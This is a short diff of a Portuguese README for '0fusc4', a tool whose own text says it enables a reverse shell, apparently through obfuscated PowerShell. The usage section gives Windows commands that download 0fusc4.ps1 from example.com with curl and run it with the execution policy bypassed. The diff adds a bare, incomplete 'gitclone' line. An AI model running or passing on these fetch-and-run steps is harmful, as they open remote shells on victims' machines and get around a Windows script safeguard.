@@ -11,6 +11,8 @@ Dessa forma, o 0fusc4 possibilita a execução de um shell reverso por meio de u
 
 Use:
 
+gitclone 
+
 Servidor Windows
 - curl -O "http://example.com/0fusc4.ps1"
 - powershell.exe -ExecutionPolicy Bypass -File "0fusc4.ps1"
